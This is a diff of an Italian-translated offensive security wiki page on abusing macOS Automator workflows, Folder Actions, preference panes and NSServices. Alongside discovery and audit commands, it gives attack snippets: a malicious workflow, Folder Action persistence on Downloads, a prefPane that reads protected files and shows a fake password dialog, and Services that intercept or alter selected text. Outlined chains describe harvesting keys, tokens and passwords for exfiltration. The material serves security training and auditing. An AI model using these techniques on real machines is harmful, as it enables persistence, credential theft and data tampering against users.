@@ -1,4 +1,4 @@
-# macOS Automator, Preference Panes & NSServices Abuso
+# macOS Automator, Preference Panes & NSServices Abuse
 
 {{#include ../../../banners/hacktricks-training.md}}
 
@@ -6,27 +6,31 @@
 
 ### Basic Information
 
-**Automator** è lo strumento di automazione visuale di macOS. Esegue **workflows** (`.workflow` bundles) composti da **actions** (`.action` bundles). Automator supporta anche **Folder Actions**, **Quick Actions**, e l'integrazione con **Shortcuts**.
+**Automator** è lo strumento di automazione visuale di macOS. Esegue **workflows** (`.workflow` bundles) composti da **actions** (`.action` bundles). Automator alimenta anche l'integrazione di **Folder Actions**, **Quick Actions** e **Shortcuts**. Su macOS moderni, i workflows possono anche essere **imported into Shortcuts**, quindi la stessa logica malevola può apparire come un Finder Quick Action, un user service sotto `~/Library/Services/`, oppure uno shortcut supportato da legacy Automator actions.
 
-Automator actions sono **plugins** caricati nel runtime di Automator quando un workflow viene eseguito. Possono:
+Le Automator actions sono **plugins** caricati nel runtime di Automator quando viene eseguito un workflow. Possono:
 - Eseguire script shell arbitrari
 - Processare file e dati
 - Interagire con applicazioni tramite AppleScript
-- Collegiarsi in catene per automazioni complesse
+- Concatenarsi per automazione complessa
 
 ### Why This Matters
 
 > [!WARNING]
-> Automator workflows can be **social-engineered** into execution — they appear as simple document files. A `.workflow` bundle can contain embedded shell commands that execute when the workflow runs. Combined with Folder Actions, they provide **automatic persistence** that triggers on file events.
+> I workflows di Automator possono essere **social-engineered** per l'esecuzione — sembrano semplici file di documento. Un bundle `.workflow` può contenere comandi shell incorporati che vengono eseguiti quando il workflow gira. In combinazione con Folder Actions, forniscono **persistentenza automatica** che si attiva su eventi dei file. Le recenti correzioni di Gatekeeper hanno anche mostrato che le **app-bundled Quick Actions** (`Contents/PlugIns/*.workflow`) devono essere trattate come contenuto eseguibile, non come dati innocui.
 
-### Scoperta
+### Discovery
 ```bash
 # Find Automator actions installed on the system
 find / -name "*.action" -path "*/Automator/*" -type d 2>/dev/null
 
-# Find user-created workflows
+# Find user-created workflows / Quick Actions
 find ~/Library/Services -name "*.workflow" 2>/dev/null
 find ~/Library/Workflows -name "*.workflow" 2>/dev/null
+find /Applications -path "*/Contents/PlugIns/*.workflow" -type d 2>/dev/null
+
+# Inspect the embedded workflow definition
+plutil -p ~/Library/Services/*.workflow/Contents/document.wflow 2>/dev/null
 
 # List active Folder Actions
 defaults read ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist 2>/dev/null
@@ -39,9 +43,9 @@ JOIN executable_handlers eh ON e.id = eh.executable_id
 JOIN handlers h ON eh.handler_id = h.id
 WHERE h.handler_type = 'automator_action';"
 ```
-### Attack: Social-Engineered Workflow
+### Attacco: Workflow Social-Engineered
 
-Un bundle `.workflow` appare come un normale documento per la maggior parte degli utenti:
+Un bundle `.workflow` appare come un normale file di documento per la maggior parte degli utenti:
 ```bash
 # Create a workflow programmatically
 mkdir -p /tmp/Evil.workflow/Contents
@@ -74,9 +78,9 @@ cat > /tmp/Evil.workflow/Contents/document.wflow << 'PLIST'
 </plist>
 PLIST
 ```
-### Attacco: Folder Action Persistence
+### Attack: Persistenza di Folder Action
 
-Folder Actions eseguono automaticamente un workflow quando vengono aggiunti file a una cartella monitorata:
+Le Folder Actions eseguono automaticamente un workflow quando vengono aggiunti file a una cartella monitorata:
 ```bash
 # Register a Folder Action on ~/Downloads
 # Every file the user downloads triggers the workflow
@@ -95,24 +99,25 @@ end tell'
 # Users can be tricked into installing a Folder Action through a .workflow double-click
 ```
 > [!CAUTION]
-> Folder Actions persistono attraverso i riavvii ed eseguono silenziosamente. Una Folder Action su `~/Downloads` significa che **ogni file scaricato attiva il tuo payload** — inclusi file da Safari, Chrome, AirDrop e allegati email.
+> Folder Actions persistono tra i reboot ed eseguono in modo silenzioso. Un Folder Action su `~/Downloads` significa **ogni file scaricato attiva il tuo payload** — inclusi i file da Safari, Chrome, AirDrop e gli allegati email. Nota anche che `System Events` può registrare Folder Actions che puntano a script al di fuori delle posizioni predefinite `~/Library/Scripts/Folder Action Scripts`, il che rende utile la ricerca di loose-path. Per le implicazioni TCC correlate, consulta [the TCC page](../macos-security-protections/macos-tcc/README.md).
 
 ---
 
-## Pannelli delle Preferenze
+## Preference Panes
 
-### Informazioni di base
+### Basic Information
 
-Preference panes (`.prefPane` bundles) sono plugin caricati in **System Settings** (precedentemente System Preferences). Forniscono pannelli dell'interfaccia di configurazione per funzionalità di sistema o di terze parti.
+Le preference panes (`.prefPane` bundles) sono plugin caricati da **System Settings** (in precedenza System Preferences). Forniscono pannelli UI di configurazione per funzionalità di sistema o di terze parti. Sui sistemi più vecchi venivano caricate direttamente da `System Preferences`; nelle release più recenti i pannelli di terze parti sono comunemente mediati da un **legacy loader XPC service** avviato da System Settings.
 
-### Perché questo è importante
+### Why This Matters
 
-- I preference panes vengono eseguiti all'interno del **System Settings process**, che potrebbe avere **elevated TCC permissions** (accessibility, full disk access in alcuni contesti)
-- I preference panes di terze parti vengono caricati in questo processo attendibile, **ereditando il suo contesto di sicurezza**
-- Gli utenti installano i preference panes con un **doppio clic** — facile social engineering
-- Una volta installati, **persistono** e vengono caricati ogni volta che System Settings si apre su quel pannello
+- Le preference panes vengono eseguite in un **trusted host process** avviato da System Settings / System Preferences
+- Sui sistemi moderni quell'host può essere un **`legacyLoader` XPC service**, quindi il confine importante resta **trusted Apple UI process -> third-party code loading**
+- Le preference panes di terze parti ereditano il **host process security context** e la fiducia dell'utente associata a quella UI
+- Gli utenti installano le preference panes con un **double-click** — facile social engineering
+- Una volta installate, **persistono** e vengono caricate ogni volta che System Settings apre quel pannello
 
-### Scoperta
+### Discovery
 ```bash
 # Find installed preference panes
 ls /Library/PreferencePanes/ 2>/dev/null
@@ -122,6 +127,10 @@ ls /System/Library/PreferencePanes/
 # Check for non-Apple preference panes (third-party)
 find /Library/PreferencePanes ~/Library/PreferencePanes -name "*.prefPane" 2>/dev/null
 
+# Look for the modern host process used to load legacy panes
+ps aux | egrep 'System Settings|System Preferences|legacyLoader'
+log show --last 1h --predicate 'process == "legacyLoader" OR process == "System Settings" OR process == "System Preferences"' 2>/dev/null
+
 # Using the scanner
 sqlite3 /tmp/executables.db "
 SELECT e.path, h.handler_metadata
@@ -130,9 +139,9 @@ JOIN executable_handlers eh ON e.id = eh.executable_id
 JOIN handlers h ON eh.handler_id = h.id
 WHERE h.handler_type = 'preference_pane';"
 ```
-### Attacco: Privilege Context Hijacking
+### Attacco: Hijacking del contesto di privilegio
 
-Un preference pane malevolo eredita il contesto di sicurezza di System Settings:
+Un pannello delle preferenze malevolo eredita il contesto di sicurezza del **host del pannello** (storicamente `System Preferences`, nelle versioni più recenti spesso un helper `legacyLoader` avviato da `System Settings`):
 ```objc
 // Preference pane principal class
 @interface MaliciousPrefPane : NSPreferencePane
@@ -141,8 +150,8 @@ Un preference pane malevolo eredita il contesto di sicurezza di System Settings:
 @implementation MaliciousPrefPane
 - (void)mainViewDidLoad {
 [super mainViewDidLoad];
-// This code runs inside System Settings process
-// It has System Settings' TCC permissions
+// This code runs inside the preference-pane host process
+// It inherits that host's permissions / trust relationship
 
 // Example: read files accessible to System Settings
 NSData *data = [NSData dataWithContentsOfFile:@"/path/to/protected/file"];
@@ -153,7 +162,7 @@ AXUIElementRef systemWide = AXUIElementCreateSystemWide();
 }
 @end
 ```
-### Attacco: Persistenza tramite Installazione
+### Attacco: Persistence tramite Installazione
 ```bash
 # Install a preference pane (user-level, no admin required)
 cp -r /tmp/Evil.prefPane ~/Library/PreferencePanes/
@@ -164,9 +173,9 @@ sudo cp -r /tmp/Evil.prefPane /Library/PreferencePanes/
 # The pane loads every time the user opens System Settings and navigates to it
 # For better persistence, set it as the default pane
 ```
-### Attack: UI Phishing
+### Attacco: UI Phishing
 
-Un pannello delle Preferenze può imitare i pannelli dell'interfaccia di sistema legittimi per **phish for credentials**:
+Un preference pane può imitare pannelli di sistema legittimi per **phishare credenziali**:
 ```objc
 // Display a fake authentication dialog
 NSAlert *alert = [[NSAlert alloc] init];
@@ -186,20 +195,21 @@ NSString *password = passwordField.stringValue;
 
 ## NSServices
 
-### Informazioni di base
+### Basic Information
 
-**NSServices** permettono alle applicazioni di fornire funzionalità ad altre app tramite il **menu Servizi** (clic destro → Servizi). Quando un utente seleziona testo o dati e invoca un servizio, i dati selezionati vengono **inviati al provider del servizio** per l'elaborazione.
+**NSServices** consentono alle applicazioni di fornire funzionalità ad altre app tramite il **menu Services** (tasto destro → Services). Quando un utente seleziona testo o dati e invoca un service, i dati selezionati vengono **inviati al service provider** per l'elaborazione.
 
-I servizi vengono dichiarati nel `Info.plist` di un'applicazione sotto la chiave `NSServices` e registrati con il server del pasteboard (`pbs`).
+I Services sono dichiarati nel `Info.plist` di un'applicazione sotto la chiave `NSServices` e registrati con il pasteboard server (`pbs`). macOS mantiene anche una **service cache** e una **restriction policy** che decidono quali Services sono visibili e se i chiamanti sandboxed debbano ricevere un avviso aggiuntivo.
 
-### Perché è importante
+### Why This Matters
 
-- I servizi ricevono un **flusso di dati tra applicazioni** — il testo selezionato da qualsiasi applicazione viene inviato al servizio
-- Un servizio malevolo acquisisce dati da gestori di password, client di posta e app finanziarie
-- I servizi possono **restituire dati modificati** all'applicazione chiamante (man-in-the-middle sulle operazioni di selezione)
-- I nomi dei servizi possono essere creati per sembrare legittimi ("Format Text", "Encrypt Selection", "Share")
+- I Services ricevono **cross-application data flow** — il testo selezionato da qualsiasi applicazione viene inviato al service
+- Un service malevolo cattura dati da password managers, email clients, financial apps
+- I Services possono **restituire dati modificati** all'applicazione chiamante (man-in-the-middle sulle operazioni di selezione)
+- I nomi dei Services possono essere creati per apparire legittimi ("Format Text", "Encrypt Selection", "Share")
+- Il flag opzionale `NSRestricted` è rilevante per la sicurezza: un service marcato come unrestricted può essere invocabile da un'app sandboxed senza l'avviso che macOS mostra per i services escape-prone
 
-### Scoperta
+### Discovery
 ```bash
 # List all registered services
 /System/Library/CoreServices/pbs -dump_pboard 2>/dev/null
@@ -210,6 +220,14 @@ find /Applications -name "Info.plist" -exec grep -l "NSServices" {} \; 2>/dev/nu
 # Check specific app's services
 defaults read /Applications/SomeApp.app/Contents/Info.plist NSServices 2>/dev/null
 
+# Inspect the service cache and the built-in restriction policy
+plutil -p ~/Library/Caches/com.apple.nsservicescache.plist 2>/dev/null
+plutil -p ~/Library/Preferences/pbs.plist 2>/dev/null
+plutil -p /System/Library/CoreServices/com.apple.NSServicesRestrictions.plist 2>/dev/null
+
+# Hunt for services explicitly marked as restricted / unrestricted
+find /Applications -name Info.plist -exec grep -Hn "NSRestricted" {} \; 2>/dev/null
+
 # Using the scanner
 sqlite3 /tmp/executables.db "
 SELECT e.path, h.handler_metadata
@@ -218,7 +236,7 @@ JOIN executable_handlers eh ON e.id = eh.executable_id
 JOIN handlers h ON eh.handler_id = h.id
 WHERE h.handler_type = 'service';"
 ```
-### Attacco: Servizio di intercettazione dati
+### Attacco: Data Interception Service
 ```xml
 <!-- Info.plist NSServices declaration -->
 <key>NSServices</key>
@@ -261,7 +279,7 @@ NSString *selectedText = [pboard stringForType:NSPasteboardTypeString];
 ```
 ### Attacco: Modifica dei dati (Man-in-the-Middle)
 
-Un servizio può **modificare i dati restituiti** mentre sembra fornire una funzione legittima:
+Un servizio può **modificare i dati restituiti** pur sembrando fornire una funzione legittima:
 ```objc
 // A "Secure Encrypt" service that actually intercepts and modifies data
 - (void)secureEncrypt:(NSPasteboard *)pboard
@@ -279,9 +297,26 @@ withString:@"attacker-account"];
 [pboard setString:modified forType:NSPasteboardTypeString];
 }
 ```
+### Servizi limitati e abuso moderno
+
+Apple supporta un `NSRestricted` booleano opzionale per ogni definizione di servizio. Se è impostato, macOS avvisa i chiamanti in sandbox perché il servizio potrebbe aiutarli a **uscire dalla sandbox o dai confini di privacy**. Da una prospettiva offensiva, questo offre due percorsi di audit utili:
+
+- Cercare **servizi di terze parti non marcati come restricted** anche se fungono da proxy per Apple Events, accesso ai file o altre azioni privilegiate
+- Cercare **servizi built-in ad alto valore** con forti entitlements (per esempio, servizi esposti da Script Editor o helper supportati da Finder) e verificare se l’interazione dell’utente è sufficiente a trasformarli in un primitive di accesso ai dati
+
+Un buon esempio recente è **CVE-2022-48574**, dove il meccanismo Services poteva essere abusato per raggiungere **file utente protetti da TCC senza il flusso di conferma previsto**. Il bug è stato corretto, ma la tecnica resta utile per il threat modeling: qualsiasi servizio che inoltri richieste di accesso ai file o di automazione per conto del chiamante merita la stessa attenzione.
+
 ---
 
-## Catene di attacco tra tecniche
+## Note di sicurezza recenti
+
+- **Quick Actions sono contenuto eseguibile**: Apple ha corretto nel 2024 un bypass di Gatekeeper in cui una Quick Action Automator inclusa in un’app poteva essere eseguita senza la normale valutazione. Quando fai audit delle app, ispeziona `Contents/PlugIns/*.workflow/Contents/document.wflow` esattamente come controlleresti script helper o login items. Vedi [la pagina di Gatekeeper](../macos-security-protections/macos-gatekeeper.md).
+- **Shortcuts possono ereditare il comportamento legacy di Automator**: Apple ha anche aggiunto un prompt di consenso utente aggiuntivo dopo che sono stati trovati shortcut di terze parti che usavano una **legacy Automator action** per inviare Apple Events senza il flusso di autorizzazione previsto. I workflow importati e i bundle di shortcut dovrebbero essere esaminati per `Run AppleScript`, `Run Shell Script` e azioni bridge simili. Vedi [la pagina di TCC](../macos-security-protections/macos-tcc/README.md).
+- **Automator è ancora un confine di privacy attivo**: Apple ha rilasciato un altro fix di Automator nel 2025 per l’accesso ai dati utente protetti. Anche se Automator è una superficie legacy, tratta qualsiasi workflow runner, host di Quick Action o bridge di automazione come una superficie d’attacco attuale, non come codice morto.
+
+---
+
+## Catene di attacco cross-technique
 
 ### Automator Folder Action → Credential Harvesting
 ```
@@ -290,15 +325,15 @@ withString:@"attacker-account"];
 3. grep -r "BEGIN RSA PRIVATE KEY\|password\|token" on each file
 4. Exfiltrate findings
 ```
-### Pannello Preferenze → Escalation TCC
+### Preference Pane → Escalation TCC
 ```
 1. Distribute malicious prefPane (social engineering)
 2. User double-clicks → installed in ~/Library/PreferencePanes/
-3. PrefPane runs inside System Settings context
-4. Inherits System Settings' TCC grants
-5. Access protected data, control other apps via inherited Accessibility
+3. PrefPane is loaded by the System Settings / legacyLoader host
+4. Inherits the host process trust and any useful entitlements / TCC posture
+5. Access protected data, control other apps, or phish from a trusted Apple UI
 ```
-### NSService → Furto del gestore di password
+### NSService → Furto di Password Manager
 ```
 1. Register a service named "Secure Copy"
 2. User selects password in password manager
@@ -306,11 +341,9 @@ withString:@"attacker-account"];
 4. Service receives the password text
 5. Exfiltrate while placing it on clipboard normally
 ```
-## Riferimenti
+## References
 
-* [Apple Developer — Guida alla programmazione di Automator](https://developer.apple.com/library/archive/documentation/AppleApplications/Conceptual/AutomatorConcepts/Automator.html)
-* [Apple Developer — Guida alla programmazione dei pannelli Preferenze](https://developer.apple.com/library/archive/documentation/UserExperience/Conceptual/PreferencePanes/Introduction/Introduction.html)
-* [Apple Developer — Guida all'implementazione dei Services](https://developer.apple.com/library/archive/documentation/Cocoa/Conceptual/SysServices/introduction.html)
-* [Objective-See — Persistenza delle Folder Action](https://objective-see.org/blog.html)
+* [Apple — About the security content of macOS Ventura 13.7, Sonoma 14.7, and Sequoia 15](https://support.apple.com/en-us/121238)
+* [Moonlock — How the NSServices exploit worked on macOS](https://moonlock.com/nsservices-macos)
 
 {{#include ../../../banners/hacktricks-training.md}}
